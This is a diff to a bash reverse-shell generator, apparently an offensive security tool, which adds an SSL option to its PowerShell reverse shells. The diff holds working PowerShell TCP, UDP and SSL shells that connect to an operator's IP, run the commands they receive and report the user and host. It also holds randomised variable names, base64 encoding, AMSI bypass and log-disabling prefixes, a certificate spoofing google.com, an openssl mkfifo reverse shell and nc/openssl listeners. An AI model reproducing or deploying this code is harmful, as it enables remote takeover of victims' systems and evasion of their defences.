@@ -4,7 +4,7 @@
 #Mastadon: 4ndr34z@infosec.exchange
 #Web: https://f20.be
 DIR="$1"
-version="1.5.8"
+version="1.5.9"
 
 ### Colors ##
 ESC=$(printf '\033') RESET="${ESC}[0m" BLACK="${ESC}[30m" RED="${ESC}[31m"
@@ -614,6 +614,8 @@ sendbyte=$(openssl rand -hex $(shuf -i 1-11 -n1))
 bytes=$(openssl rand -hex $(shuf -i 1-11 -n1))
 i=$(openssl rand -hex $(shuf -i 1-11 -n1))
 endpoint=$(openssl rand -hex $(shuf -i 1-11 -n1))
+networkStream=$(openssl rand -hex $(shuf -i 1-12 -n1))
+ssl=$(openssl rand -hex $(shuf -i 1-5 -n1))
 ip=$(openssl rand -hex $(shuf -i 1-11 -n1))
 port=$(openssl rand -hex $(shuf -i 1-13 -n1))
 socket=$(shuf -er -n8  {A..Z} {a..z} | tr -d '\n')
@@ -692,11 +694,14 @@ if [[ $4 == "udp" ]]
 then
     #UDP
     shell="$AMSIb$disableLog$func$fAMSIb\$$endpoint = New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(\"$IP\"),$PORT);\$$client = New-Object Net.\$$placeh\"Sockets.UDPClient($PORT, [Net.Sockets.AddressFamily]::InterNetwork);[byte[]]\$$bytes = 0..65535|%{0};\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$env:username + '$at' + \$env:computername + \"\`n\`n\");\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);\$$sendbyte = ([text.encoding]::UTF8).GetBytes('PS ' + (Get-Location).Path + '> ');\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);while(\$true){\$$receivebytes = \$$client.Receive([ref]\$$endpoint);\$$returndata = ([text.encoding]::UTF8).GetString(\$$receivebytes);\$$result = (Invoke-Expression -Command \$$returndata 2>&1 | Out-String );\$$sendback = \$$result +  'PS ' + (Get-Location).Path + '> ';\$$x = (Out-String);\$$sendback2 = \$$sendback + \$$x;\$$sendbyte = ([text.encoding]::UTF8).GetBytes(\$$sendback2);\$$client.Send(\$$sendbyte,\$$sendbyte.Length,\$$endpoint);}\$$client.Close();"
-else
-    
+elif [[ $4 == "tcp" ]]
+then    
     #TCP
     shell="$AMSIb$disableLog$fAMSIb$func\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$socket.Receive(\$$input);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output=Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message+([System.Environment]::NewLine);}if (!\$$output) {\$$output = \$Error[0].Exception.Message};\$$info=(\$env:UserName)+'@'+(\$env:COMPUTERNAME)+'.'+(\$env:USERDNSDOMAIN)+([System.Environment]::NewLine)+(get-location)+'>';\$$outbytes=[text.encoding]::UTF8.GetBytes(\$$output+\$$info);if(\$$cmd -eq ''){\$$socket.Close();exit;}else{\$$socket.Send(\$$outbytes);}}"
-    
+
+else
+    #SSL
+    shell="\$$ip='$IP';\$$port=$PORT;\$$socket=New-Object Net.\$$placeh\"Sockets.Socket\"([Net.Sockets.AddressFamily]::InterNetwork, [Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);\$$socket.Connect(\$$ip, \$$port);\$$networkStream=New-Object System.Net.\$$placeh\"Sockets.\"NetworkStream(\$$socket, \$true);\$$ssl = New-Object Net.Security\$$placeh\".SslStream\"(\$$networkStream, \$false, {\$true}, \$$placeh);\$$ssl.AuthenticateAsClient('google.com',\$$placeh,\$false);while (\$true) {\$Error.Clear();\$$input = New-Object byte[] \$$socket.ReceiveBufferSize;\$$read=\$$ssl.Read(\$$input, 0, \$$input.Length);\$$cmd=[text.encoding]::UTF8.GetString(\$$input,0, \$$read);try {\$$output =  Invoke-Expression -Command \$$cmd | Out-String;} catch {\$$output = \$_.Exception.Message;}if (!\$$output) {\$$output = \$Error[0].Exception.Message;}\$$info = (\$env:UserName) + '@' + (\$env:COMPUTERNAME) + '.' + (\$env:USERDNSDOMAIN) + ([System.Environment]::NewLine) + (get-location) + '>';\$$outbytes = [text.encoding]::UTF8.GetBytes(\$$output+\$$info);if ( \$$cmd -eq '' ) {\$$ssl.Close();\$$networkStream.Close();\$$socket.Close();exit;}else {\$$ssl.Write(\$$outbytes, 0, \$$outbytes.Length);}}"
 fi
 
 shell=$(echo -n $shell | iconv --to-code UTF-16LE | $benc --base64 -w0)
@@ -983,8 +988,7 @@ then
     PORT=$ngrokPORT
 fi
 header
-#echo "Generating certificate..."
-openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=shells.com"
+
 rev="mkfifo /tmp/s; $nshell -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $IP:$PORT > /tmp/s; rm /tmp/s"
 
 if [[ $1 == "url" ]] 
@@ -1667,15 +1671,25 @@ if [[ $1 == "udp" ]]
 then
     prot="-u"
 fi
- echo -ne "
+echo -ne "
 
-$(blueprint 'Listener')
+$(blueprint 'Listener')"
+
+if [  "$poshproto" == "ssl" ]
+then
+    defChoice=3
+else
+    defChoice=1
+    
+fi
+
+echo -ne "
 $(greenprint '1)') rlwrap nc $1
 $(greenprint '2)') nc $1
 $(greenprint '3)') OpenSSL
 $(magentaprint 'm)') Go Back to Main Menu
 $(redprint '0)') Exit
-Choose an option [1]:  "
+Choose an option [$defChoice]:  "
 
 if [[ $usingngrok == 1 ]]
 then
@@ -1706,6 +1720,8 @@ fi
         
         ;;
     3)
+        echo -e "Generating certificate..."
+        openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=google.com" >/dev/null 2>&1
         echo
         echo "Listening on port: $PORT"
         openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port "$PORT"
@@ -1720,12 +1736,21 @@ fi
         fn_bye
         ;;
     "")
-        if [[ $OS == "Darwin" ]]
+        if [ $defChoice == 1 ]
         then
-            printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
-            $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
+            if [[ $OS == "Darwin" ]]
+            then
+                printf "\n\nRemember: macOS nc does not notify on incoming connections.\nListening on port: $PORT\n\n";
+                $rlwrap -cAr /usr/bin/nc $prot -lvn $PORT
+            else
+                printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
+            fi
         else
-        printf "\n\n";$rlwrap -cAr $nc $prot -lvnp $PORT
+            echo -e "Generating certificate..."
+            openssl req -x509 -newkey rsa:4096 -keyout /tmp/k.pem -out /tmp/c.pem -days 365 -nodes -subj "/C=US/ST=*/L=*/O=*/CN=google.com" >/dev/null 2>&1
+            echo
+            echo "Listening on port: $PORT"
+            openssl s_server -quiet -key /tmp/k.pem -cert /tmp/c.pem -port "$PORT"
         fi
         ;;
     esac
@@ -1939,30 +1964,24 @@ Choose an option [1]:  "
 
 submenu_powershell() {
 #Setting default options for Powershell revshell 
-
+if [ "$poshproto" == "" ]
+then
+    poshproto="tcp"
+fi
 header
     echo -ne "
 $(blueprint 'Powershell')
-$(greenprint '1)')  Powershell TCP - Windows 
-$(greenprint '2)')  Powershell TCP - Windows URL encoded
-$(greenprint '3)')  Powershell TCP - Windows Double URL encoded
-$(greenprint '4)')  Powershell TCP - Windows Core
-$(greenprint '5)')  Powershell TCP - Windows Core URL encoded
-$(greenprint '6)')  Powershell TCP - Windows Core Double URL encoded
-$(greenprint '7)')  Powershell TCP - Core
-$(greenprint '8)')  Powershell TCP - Core URL encoded
-$(greenprint '9)')  Powershell TCP - Core Double URL encoded
-$(greenprint '10)') Powershell UDP - Windows 
-$(greenprint '11)') Powershell UDP - Windows URL encoded
-$(greenprint '12)') Powershell UDP - Windows Double URL encoded
-$(greenprint '13)') Powershell UDP - Windows Core
-$(greenprint '14)') Powershell UDP - Windows Core URL encoded
-$(greenprint '15)') Powershell UDP - Windows Core Double URL encoded
-$(greenprint '16)') Powershell UDP - Core
-$(greenprint '17)') Powershell UDP - Core URL encoded
-$(greenprint '18)') Powershell UDP - Core Double URL encoded
-$(greenprint '19)') Powershell TCP - Windows - VBA Macro
-$(greenprint '20)') Powershell UDP - Windows - VBA Macro \n\n"
+$(greenprint '1)')  Powershell - Windows 
+$(greenprint '2)')  Powershell - Windows URL encoded
+$(greenprint '3)')  Powershell - Windows Double URL encoded
+$(greenprint '4)')  Powershell - Windows Core
+$(greenprint '5)')  Powershell - Windows Core URL encoded
+$(greenprint '6)')  Powershell - Windows Core Double URL encoded
+$(greenprint '7)')  Powershell - Windows VBA Macro (MS Office)
+$(greenprint '8)')  Powershell - Core
+$(greenprint '9)')  Powershell - Core URL encoded
+$(greenprint '10)') Powershell - Core Double URL encoded\n\n"
+
 echo -n $(cyanprint "OPTIONS")
 if [ "$blockmssense" == 1 ]
 then 
@@ -2002,6 +2021,7 @@ else
     fullamsi=0
     
 fi
+echo -e "\n$(greenprint 'p)') Protocol [$(yellowprint $poshproto)]"
 echo -ne "\n$(greenprint 'a)') About Options"
 echo 
 echo -ne "
@@ -2012,65 +2032,37 @@ Choose an option:  "
     read -r -n 2 ans
     case $ans in
     1)
-        powershell_s "" "" "w"
+        powershell_s "" "" "w" "$poshproto"
         ;;
     2)
-        powershell_s "url" "" "w"
+        powershell_s "url" "" "w" "$poshproto"
         ;;
     3)
-        powershell_s "urlx2" "" "w"
+        powershell_s "urlx2" "" "w" "$poshproto"
         ;;
     4)
-        powershell_s "" "core" "w"
+        powershell_s "" "core" "w" "$poshproto"
         ;;
     5)
-        powershell_s "url" "core" "w"
+        powershell_s "url" "core" "w" "$poshproto"
         ;;
     6)
-        powershell_s "urlx2" "core" "w"
+        powershell_s "urlx2" "core" "w" "$poshproto"
         ;;
     7)
-        powershell_s "" "core"
+        powershell_s "" "" "w" "$poshproto" "vba"
         ;;
     8)
-        powershell_s "url" "core"
+        powershell_s "" "core" "" "$poshproto"
         ;;
     9)
-        powershell_s "urlx2" "core"
+        powershell_s "url" "core" "" "$poshproto"
         ;;
     10)
-        powershell_s "" "" "w" "udp"
+        powershell_s "urlx2" "core" "" "$poshproto"
         ;;
-    11)
-        powershell_s "url" "" "w" "udp"
-        ;;
-    12)
-        powershell_s "urlx2" "" "w" "udp"
-        ;;
-    13)
-        powershell_s "" "core" "w" "udp"
-        ;;
-    14)
-        powershell_s "url" "core" "w" "udp"
-        ;;
-    14)
-        powershell_s "urlx2" "core" "w" "udp"
-        ;;
-    16)
-        powershell_s "" "core" "" "udp"
-        ;;
-    17)
-        powershell_s "url" "core" "" "udp"
-        ;;
-    18)
-        powershell_s "urlx2" "core" "" "udp"
-        ;;
-    19)
-        powershell_s "" "" "w" "" "vba"
-        ;;
-    20)
-        powershell_s "" "" "w" "udp" "vba"
-        ;;
+   
+    
     b)
         if [ $blockmssense == 0 ]
         then 
@@ -2114,6 +2106,10 @@ Choose an option:  "
         fi
         submenu_powershell
         ;;
+     p)
+        submenu_powershell_protocols
+        ;;
+
     a)
         header
         printf "
@@ -2142,6 +2138,9 @@ Choose an option:  "
         If you enable updog, you can have this file generated and served automatically. 
         You can of course choose to enter a url to any other script you would have run upon connection
 
+        p) Protocol
+        Choose between TCP, UDP and SSL
+
         "
         read -p "Press enter to return to menu"
        submenu_powershell
@@ -2158,6 +2157,41 @@ Choose an option:  "
     
     *)
         fn_fail
+        ;;
+    esac
+}
+
+submenu_powershell_protocols() {
+if [ "$poshproto" == "" ]
+then
+    poshproto="tcp"
+fi
+
+header
+    echo -ne "
+$(blueprint 'Protocol')
+$(greenprint '1)') SSL
+$(greenprint '2)') TCP
+$(greenprint '3)') UDP
+$(magentaprint 'b)') Go Back
+
+Choose an option:  "
+    read -r -n 1 ans
+    case $ans in
+    1)
+        poshproto="ssl"
+        submenu_powershell
+        ;;
+    2)
+        poshproto="tcp"
+        submenu_powershell
+        ;;
+    3)
+        poshproto="udp"
+        submenu_powershell
+        ;;
+    b)
+        submenu_powershell
         ;;
     esac
 }
@@ -2566,6 +2600,7 @@ Choose an option:  "
 }
 
 submenu_open_s() {
+poshproto="ssl"
 if [ "$nshell" == "" ]
 then
     nshell="/bin/bash"
@@ -2840,7 +2875,7 @@ Choose an option:  "
 mainmenu() {
 header
 
-
+poshproto=""
 if [[ $ngrok_installed == 1 ]]
 then 
     ngrok_choice="$(greenprint 'n)')  Start/Stop ngrok"
